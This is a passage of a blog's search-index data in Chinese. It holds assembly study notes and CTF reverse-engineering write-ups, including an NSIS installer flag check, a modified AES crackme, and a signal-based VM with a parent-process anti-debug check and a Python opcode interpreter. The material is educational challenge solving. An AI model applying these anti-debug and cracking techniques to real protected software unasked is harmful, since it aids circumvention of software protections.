stack:\" + str(stack)+'\\n') pc = pc + 2 else: f.write(\"not equal, jump\") f.write(\"--\u003e now stack:\" + str(stack)+'\\n') if code[pc+1] \u003c= 0x7f: pc = pc + code[pc+1] else: pc = pc - (256 - code[pc + 1]) elif c == 0x15: a = stack[-2] b = stack[-1] del stack[-1] del stack[-1] f.write(\"cmp\") if a\u003c=b: f.write(\"less or equal, go on\") pc = pc + 2 f.write(\"--\u003e now stack:\" + str(stack)+'\\n') else: f.write(\"not less or equal, jump\") f.write(\"--\u003e now stack:\" + str(stack)+'\\n') if code[pc+1] \u003c= 0x7f: pc = pc + code[pc+1] else: pc = pc - (256 - code[pc + 1]) elif c == 0x16: a = stack[-2] b = stack[-1] del stack[-1] del stack[-1] f.write(\"cmp\") if a \u003c b: f.write(\"less, go on\") f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 2 else: f.write(\"not less, jump\") f.write(\"--\u003e now","date":"2020-04-20","objectID":"/%E8%99%8E%E7%AC%A62020%E9%83%A8%E5%88%86re/:2:0","tags":null,"title":"虎符2020部分re","uri":"/%E8%99%8E%E7%AC%A62020%E9%83%A8%E5%88%86re/"},{"categories":["notes"],"content":"使用gcc生成AT\u0026T汇编风格的代码 gcc -S -o test.s test.c ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:1:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"与Intel相比 寄存器前冠以“％”，而立即数前冠以“$” 目标操作数在源操作数的右边mov $1, a ==\u003e a=1, sub 1,a ==\u003e a=a-1 操作数的字长由操作符的最后一个字母决定 内存寻址movw array(%base, %index, scale), %cx ==\u003e cx=base+index*scale(scale等于1, 4 or 8 intel中基地址使用“[” 、“]” ，而在 AT\u0026T 中使用“(”、“)” ；另外处理复杂操作数的语法 也 不同 ， intel为 Segreg:[base+index*scale+disp]， 而在 AT\u0026T 中为%segreg:disp(base,index,sale)，其中segreg，index，scale，disp都是可选的，在指定index而没有显式指定Scale的情况下使用默认值 1。Scale和 disp不需要加前缀“\u0026” 内存操作数的语法及举例 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:2:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"cmp指令 cmp是比较指令,cmp的功能相当于减法指令(sub)。它不保存结果，只是影响相应的标志位。其他的指令通过识别这些被影响的标志位来得知比较结果。 cmp指令格式: cmp 操作对象1, 操作对象2 注意是计算 操作对象2 - 操作对象1，和sub的一样， 但不保存结果，只是根据结果修改相应的标志位。 flag寄存器 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:3:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"移位指令 ;SHL(Shift Left): 逻辑左移 ;SHR(Shift Right): 逻辑右移 ;SAL(Shift Arithmetic Left): 算术左移 ;SAR(Shift Arithmetic Right): 算术右移 ;其中的 SHL 和 SAL 相同, 但 SHR 和 SAR 不同. ;SHL、SAL: 每位左移, 低位补 0, 高位进 CF ;SHR : 每位右移, 低位进 CF, 高位补 0 ;SAR : 每位右移, 低位进 CF, 高位不变 ;它们的结果影响 OF、SF、ZF、PF、CF ;它们的指令格式相同: movl$0, %eax # result= 0 .L2: # loop: movq%rdi, %rdx andl$1, %edx # t = x\u0026 0x1 addq%rdx, %rax # result+= t shrq%rdi # x\u003e\u003e= 1 jne.L2 # if(x) gotoloop //注意这里 rep; ret # synonym of “ret” ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:4:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"JL/JG 和 JB/JA JL: jump less 有符号小于跳转 JG: jump great 有符号大于 JB: jump below 无符号小于 JA: jump above 无符号大于 JLE/JNE... ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:5:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"switch指令汇编形式 条件判断 #include \u003calgorithm\u003e int test_switch(){ int i ; int a = std::rand(); switch(a){ case 0: i = 0;break; case 1: i = 1;break; case 2: i = 2;break; default: i = 3;break; } return i; } 汇编 movl -4(%rbp), %eax cmpl $1, %eax je .L3 cmpl $2, %eax je .L4 testl %eax, %eax jne .L8 movl $0, -8(%rbp) jmp .L6 .L3: movl $1, -8(%rbp) jmp .L6 .L4: movl $2, -8(%rbp) jmp .L6 .L8: movl $3, -8(%rbp) nop 逐条件判断法 #include \u003calgorithm\u003e int test_switch(){ int i ; int a = std::rand(); switch(a){ case 0: i = 0;break; case 1: i = 1;break; case 2: i = 2;break; case 3: i = 3;break; case 4: i = 4;break; case 5: i = 5;break; case 6: i = 6;break; case 7: i = 7;break; case 8: i = 8;break; case 9: i = 9;break; default: i = 10;break; } return i; } 汇编 movl -4(%rbp), %eax movq .L4(,%rax,8), %rax jmp *%rax .L4: .quad .L3 .quad .L5 .quad .L6 .quad .L7 .quad .L8 .quad .L9 .quad .L10 .quad .L11 .quad .L12 .quad .L13 .text .L3: movl $0, -8(%rbp) jmp .L14 .L5: movl $1, -8(%rbp) jmp .L14 ... 二分查找 #include \u003calgorithm\u003e int test_switch(){ int i ; int a = std::rand(); switch(a){ case 4: i = 4;break; case 10: i = 10;break; case 50: i = 50;break; case 100: i = 100;break; case 200: i = 200;break; case 500: i = 500;break; default: i = 0;break; } return i; } 汇编 movl -4(%rbp), %eax cmpl $50, %eax je .L3 cmpl $50, %eax jg .L4 cmpl $4, %eax je .L5 cmpl $10, %eax je .L6 jmp .L2 .L4: cmpl $200, %eax je .L7 cmpl $500, %eax je .L8 cmpl $100, %eax je .L9 jmp .L2 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:6:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"栈结构 函数调用时的栈结构 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:7:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"gdb指令 gdb$ p *(int *)($rbp-0x14) //打印$rbp-0x14处地址中存储的值 gdb$ x /x $rbp-0x14 //same ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:8:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"mov指令与lea指令 lea指令不解引用 mov 8(%rbp), rdi --\u003e rdi = *($rbp+8) lea 8(%rbp), rdi --\u003e rdi = ($rbp + 8) ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:9:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"test指令 test属于逻辑运算指令 功能: 执行BIT与BIT之间的逻辑运算 测试(两操作数作与运算,仅修改标志位,不回送结果). Test对两个参数(目标，源)执行AND逻辑操作,并根据结果设置标志寄存器,结果本身不会保存。EST AX,BX 与 AND AX,BX 命令有相同效果 语法: TEST r/m,r/m/data 影响标志: C,O,P,Z,S(其中C与O两个标志会被设为0) 运用举例: 1.Test用来测试一个位,例如 test eax, 100b; b表示二进制 jnz **; 如果eax右数第三个位为1,jnz将会跳转 2.Test的一个非常普遍的用法是用来测试一方寄存器是否为空: test ecx, ecx jz somewhere 如果ecx为零,设置ZF零标志为1,Jz跳转 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:10:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"寄存器 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:11:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"直接跳转\u0026间接跳转 直接跳转：跳转目标是作为指令封一部分编码。 间接跳转：目标是从寄存器或存储器位置读出来的。 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:12:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"typdef #define ZLEN 5 typedef int zip_dig[ZLEN]; zip_dig cmu= { 1, 5, 2, 1, 3 }; //zip_dig cmu相当于int cmu[5] ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:13:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"二维数组的存储 A[i][j]的地址A+(i*C*4)+(j*4) 指针数组版本 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:14:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"结构体和偏移 如果结构体中最大的对齐要求是k那么总结构体的大小一定是k的倍数 eg struct S1{ double v; int a[2]; char c; }; //结构体大小为24(double的倍数)而不是17/18 struct S1{ double v; char c[4]; }; //结构体大小是16(double的倍数)而不是12 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:14:1","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"Union 只分配最大的变量的存储空间，一次只允许使用一个值。 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:15:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"ISA 一个处理器支持的指令和指令的字节级编码称为它的指令集体系结构（Instruction-Set Architecture,ISA） ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:16:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"Y86-64指令集 https://www.cnblogs.com/ysocean/p/7686213.html http://hczhcz.github.io/2014/06/13/y86-instruction-set.html ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:16:1","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"HCL https://www.cnblogs.com/ysocean/p/7686219.html 门电路 MUX \u0026 ALU 寄存器与存储器 大多数时候，寄存器都保持在稳定状态（用x表示），产生的输出等于它的当前状态，信号沿着寄存器前面的组合逻辑传播，这时产生了一个新的寄存器输入（用y表示），但是只要时钟信号是低电位的，寄存器的输出就保持不变。当时钟变为高电位时，输入信号就加载到寄存器中，称为下一个状态y，直到下一个时钟上升沿，这个状态就一直是寄存器的新输出。 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:17:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["notes"],"content":"SEQ CPU https://blog.csdn.net/dennis_fan/article/details/8284248 ","date":"2020-04-10","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/:18:0","tags":null,"title":"汇编基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%8D%81%E5%A4%A9%E6%B1%87%E7%BC%96%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87/"},{"categories":["writeup"],"content":"First 官方wp有点简略…研究了一下补个详细的。我好菜我好菜我好菜。很多代码都是官方wp里面的，拿过来做个笔记. ","date":"2020-04-05","objectID":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/:1:0","tags":null,"title":"i春秋公益赛_部分re题目","uri":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/"},{"categories":["writeup"],"content":"奇怪的安装包 这道题其实不是很难,但是我是动态调试做出来的,看到wp上的解法要简单很多。 这里的安装包使用nsis打包,NSIS的打包教程如下: 使用nsis打包程序 其中有NSIS脚本可以自定义安装的步骤,所以这个题目中弹出的key和flag的验证窗口就是写在NSIS脚本中的。 我本来觉得是应该有脚本的,我用了普通解压的方式解开了exe文件,但是并没有发现NSIS脚本。后来知道是NSIS后查了一下,发现只有19.00版本的7z才可以解压得到NSIS脚本。具体可以在这里下载： 7-Zip 19.00 增加nsis脚本反编译版 flag部分的验证过程如下: Dialogs::InputBox 1 请输入flag \"Input your flag\" 确定 取消 4 6 ; Call Initialize_____Plugins ; AllowSkipFiles off ; File $PLUGINSDIR\\Dialogs.dll ; SetDetailsPrint lastused ; Push 6 ; Push 4 ; Push 取消 ; Push 确定 ; Push \"Input your flag\" ; Push 请输入flag ; Push 1 ; CallInstDLL $PLUGINSDIR\\Dialogs.dll InputBox IntCmp $4 1 0 label_415 label_415 Push $6 Call func_429 Pop $6 StrCpy $3 gm`fzd787`7bb,g72d,592b,8`g1,cg96813e8d``| StrCmp $3 $6 0 label_417 MessageBox MB_OK flag正确,可以愉快的玩游戏了 Goto label_419 Function func_429 Pop $9 StrCpy $3 \"\" StrCpy $0 $9 StrCpy $1 0 label_433: StrCpy $2 $0 1 $1 StrCmp $2 \"\" label_443 Push $2 Call func_445 Pop $2 IntOp $2 $2 ^ 1 IntFmt $2 %c $2 IntOp $1 $1 + 1 StrCpy $3 $3$2 Goto label_433 label_443: Push $3 FunctionEnd Function func_445 Exch $0 ; Push $0 ; Exch ; Pop $0 Push $1 Push $2 StrCpy $2 1 label_451: IntFmt $1 %c $2 StrCmpS $1 $0 0 label_455 StrCpy $0 $2 Goto label_458 label_455: IntOp $2 $2 + 1 StrCmp $2 255 0 label_451 StrCpy $0 0 label_458: Pop $2 Pop $1 Exch $0 ; Push $0 ; Exch ; Pop $0 FunctionEnd 过程就是与1异或以后的值与gm`fzd787`7bb,g72d,592b,8`g1,cg96813e8d``|相等 ","date":"2020-04-05","objectID":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/:2:0","tags":null,"title":"i春秋公益赛_部分re题目","uri":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/"},{"categories":["writeup"],"content":"CrackMe 是一个修改了的AES代码(加密前后各多了一个异或的操作，并且替换了常用的S盒,代码里面还比较贴心的给了对应的逆S盒),官方给了一个比较齐全的AES的c代码(查表法),留作参考,毕竟让我自己看我是看不出来的…对照着看还有可能… // // AES.hpp // AES // // Created by zoe on 2020/3/3. // Copyright © 2020年 zoe. All rights reserved. // #pragma once #ifndef SRC_UTILS_AES_H #define SRC_UTILS_AES_H class AES { public: AES(unsigned char* key); virtual ~AES(); unsigned char* Cipher(unsigned char* input); // 加密，传入的数组大小必须是16字节 unsigned char* InvCipher(unsigned char* input); // 解密，传入的数组也必须是16字节 void* Cipher(void* input, int length = 0); // 可以传入数组，大小必须是16的整数倍，如果不是将会越界操作；如果不传length而默认为0，那么将按照字符串处理，遇'\\0'结束 void* InvCipher(void* input, int length); // 必须传入数组和大小，必须是16的整数倍 void AddRoundKey(unsigned char state[][4], unsigned char k[][4]); private: unsigned char Sbox[256]; unsigned char InvSbox[256]; unsigned char w[11][4][4]; void KeyExpansion(unsigned char* key, unsigned char w[][4][4]); unsigned char FFmul(unsigned char a, unsigned char b); void SubBytes(unsigned char state[][4]); void ShiftRows(unsigned char state[][4]); void MixColumns(unsigned char state[][4]); void InvSubBytes(unsigned char state[][4]); void InvShiftRows(unsigned char state[][4]); void InvMixColumns(unsigned char state[][4]); }; #endif // SRC_UTILS_AES_H // // AES.cpp // AES // // Created by zoe on 2020/3/3. // Copyright © 2020年 zoe. All rights reserved. // #include \"AES.hpp\" #include \"string.h\" using namespace std; AES::AES(unsigned char* key) { unsigned char sBox[] = { 0x36, 0x4F, 0x62, 0xD8, 0xB5, 0x84, 0xCD, 0xF6, 0xDC, 0x2A, 0xE6, 0xED, 0xAB, 0x52, 0x01, 0xAF, 0xD0, 0x0A, 0x68, 0x14, 0x27, 0xA1, 0xDB, 0x87, 0x9C, 0xE7, 0x29, 0x66, 0x35, 0xE9, 0xB4, 0x91, 0x8B, 0xCE, 0xF3, 0x34, 0x56, 0x5E, 0x23, 0x61, 0x70, 0xC3, 0xA7, 0x32, 0x2D, 0x80, 0x0C, 0xC4, 0xF5, 0x2C, 0x72, 0xA4, 0xC9, 0x06, 0xB9, 0x6E, 0x19, 0x12, 0x07, 0x22, 0xD6, 0xD3, 0x00, 0x71, 0x98, 0x0E, 0x6B, 0xCA, 0x64, 0x3D, 0xBA, 0xFE, 0x88, 0x02, 0xE3, 0x46, 0xEF, 0x1F, 0x2F, 0x8F, 0x2E, 0x3A, 0x31, 0x9B, 0xF0, 0xE2, 0x7B, 0x99, 0xBB, 0xA8, 0x48, 0x63, 0xD4, 0x8D, 0xF4, 0x69, 0xBF, 0xE8, 0x4B, 0xDE, 0xDA, 0x76, 0xB0, 0x10, 0xB8, 0x97, 0xC6, 0x9F, 0x16, 0xF7, 0xAC, 0xDD, 0x45, 0xBC, 0xC5, 0xE1, 0xAD, 0x7C, 0x5B, 0xFC, 0xCC, 0xAE, 0x59, 0x9A, 0x6F, 0xE5, 0x67, 0xA3, 0x58, 0xC7, 0x8C, 0x65, 0x81, 0x49, 0x53, 0x83, 0x40, 0x39, 0x5D, 0x37, 0xB1, 0x74, 0x8E, 0x4D, 0xCF, 0x33, 0xF8, 0xA2, 0x75, 0x73, 0xFA, 0xD7, 0x4A, 0xCB, 0x82, 0x78, 0x17, 0xE0, 0x95, 0x7D, 0x08, 0xF1, 0xBD, 0x41, 0xB7, 0x04, 0x0F, 0x8A, 0xD1, 0x51, 0x3E, 0x38, 0x93, 0xC2, 0x89, 0xD2, 0x96, 0x94, 0x1A, 0xFB, 0x5F, 0x7E, 0x60, 0x24, 0x54, 0xEA, 0x7F, 0x0B, 0x1B, 0x43, 0x26, 0x2B, 0x1C, 0xB3, 0x4E, 0x85, 0x3F, 0x5A, 0xC0, 0x1E, 0x50, 0x77, 0xFF, 0x09, 0xE4, 0x9E, 0x25, 0x9D, 0x05, 0x13, 0xEE, 0xD5, 0x30, 0xAA, 0x28, 0x79, 0x86, 0x4C, 0xF9, 0x57, 0x6D, 0xEB, 0x47, 0xB2, 0xD9, 0x18, 0xB6, 0xBE, 0x7A, 0xC1, 0xA0, 0x0D, 0x5C, 0xC8, 0xA5, 0x44, 0x6A, 0x3C, 0x20, 0xA6, 0x03, 0x11, 0x3B, 0x15, 0x90, 0xFD, 0x92, 0xEC, 0xA9, 0x21, 0x55, 0x1D, 0xDF, 0x6C, 0x42, 0xF2 }; unsigned char invsBox[256] = { 0x3e, 0x0e, 0x49, 0xf0, 0xa5, 0xd0, 0x35, 0x3a, 0xa0, 0xcb, 0x11, 0xbb, 0x2e, 0xe7, 0x41, 0xa6, 0x67, 0xf1, 0x39, 0xd1, 0x13, 0xf3, 0x6c, 0x9c, 0xe1, 0x38, 0xb2, 0xbc, 0xc0, 0xfb, 0xc7, 0x4d, 0xee, 0xf9, 0x3b, 0x26, 0xb7, 0xce, 0xbe, 0x14, 0xd6, 0x1a, 0x09, 0xbf, 0x31, 0x2c, 0x50, 0x4e, 0xd4, 0x52, 0x2b, 0x91, 0x23, 0x1c, 0x00, 0x8b, 0xab, 0x89, 0x51, 0xf2, 0xed, 0x45, 0xaa, 0xc4, 0x88, 0xa3, 0xfe, 0xbd, 0xeb, 0x70, 0x4b, 0xde, 0x5a, 0x85, 0x98, 0x62, 0xd9, 0x8f, 0xc2, 0x01, 0xc8, 0xa9, 0x0d, 0x86, 0xb8, 0xfa, 0x24, 0xdb, 0x80, 0x7a, 0xc5, 0x76, 0xe8, 0x8a, 0x25, 0xb4, 0xb6, 0x27, 0x02, 0x5b, 0x44, 0x83, 0x1b, 0x7e, 0x12, 0x5f, 0xec, 0x42, 0xfd, 0xdc, 0x37, 0x7c, 0x28, 0x3f, 0x32, 0x95, 0x8d, 0x94, 0x65, 0xc9, 0x9b, 0xd7, 0xe4, 0x56, 0x75, 0x9f, 0xb5, 0xba, 0x2d, 0x84, 0x9a, 0x87, 0x05, 0xc3, 0xd8, 0x17, 0x48, 0xae, 0xa7, 0x20, 0x82, 0x5d, 0x8e, 0x4f, 0xf4, 0x1f, 0xf6, 0xac, 0xb1, 0x9e, 0xb0, 0x69, 0x40, 0x57, 0x7b, 0x53, 0x18, 0xcf, 0xcd, 0x6b, 0xe6, 0x15, 0x93, 0x7f, 0x33","date":"2020-04-05","objectID":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/:3:0","tags":null,"title":"i春秋公益赛_部分re题目","uri":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/"},{"categories":["writeup"],"content":"Factory 这个题是个VM, 程序利用父进程与子进程之间使用signal通信来执行opcode,且signal的注册在main之前,main之前还利用以下代码进程反调试 v0 = getppid(); snprintf(\u0026s, 0x18uLL, \"/proc/%d/cmdline\", v0); stream = fopen(\u0026s, \"r\"); fgets(\u0026v5, 256, stream); signal注册的代码如下: 子进程使用opcode执行每个handler的过程如下: 看到一个简单的关于vm解题的教程: 从做题到出题再到做题三部曲-VM 提取opcode进行解释:(最主要的是要有寄存器、堆栈、EIP的想法) def func34(arg): global r0,r1,r2,oparg if arg == \"r0\": f.write(\"PUSH \" + arg + '\\n') stack.append(r0) elif arg == \"r1\": f.write(\"PUSH \" + arg + '\\n') stack.append(r1) elif arg == \"r2\": f.write(\"PUSH \" + arg + '\\n') stack.append(r2) elif arg == \"arg\": f.write(\"PUSH \"+ str(oparg) + '\\n') stack.append(oparg) def func35(arg): global r0,r1,r2 f.write(\"POP \" + arg + '\\n') if arg == \"r0\": r0 = stack.pop() elif arg == \"r1\": r1 = stack.pop() elif arg == \"r2\": r2 = stack.pop() def func36(): f.write(\"ADD r0, r1\\n\") def func37(arg): global oparg,r0,r1,r2 f.write(\"ADD \" + arg + \", \" + str(oparg) + '\\n') if arg == \"r0\": r0 = r0 + oparg elif arg == \"r1\": r1 = r1 + oparg elif arg == \"r2\": r2 = r2 + oparg def func38(): f.write(\"SUB r0, r1\\n\") def func39(arg): global oparg,r0,r1,r2 f.write(\"SUB \" + arg + \", \" + str(oparg) + '\\n') if arg == \"r0\": r0 = r0 - oparg elif arg == \"r1\": r1 = r1 - oparg elif arg == \"r2\": r2 = r2 - oparg def func40(): f.write(\"XOR r0, r1\\n\") def func41(): global flag f.write(\"CMP r0, r1\\n\") flag = (r0 == r1) def func42(): global EIP, oparg f.write(\"PUSH EIP\\n\") stack.append(EIP) f.write(\"MOV EIP, \" + str(oparg) + '\\n') EIP = oparg def func43(): global EIP f.write(\"POP EIP\\n\") EIP = stack.pop() def func44(): global EIP, oparg f.write(\"MOV EIP, \" + str(oparg) + '\\n') EIP = oparg def func45(): global EIP, oparg, flag if flag: f.write(\"EQ MOV EIP, \" + str(oparg) + '\\n') EIP = oparg def func46(): global r2 f.write(\"PUSH input[\"+str(r2)+\"]\\n\") stack.append(input[r2]) def func47(): global 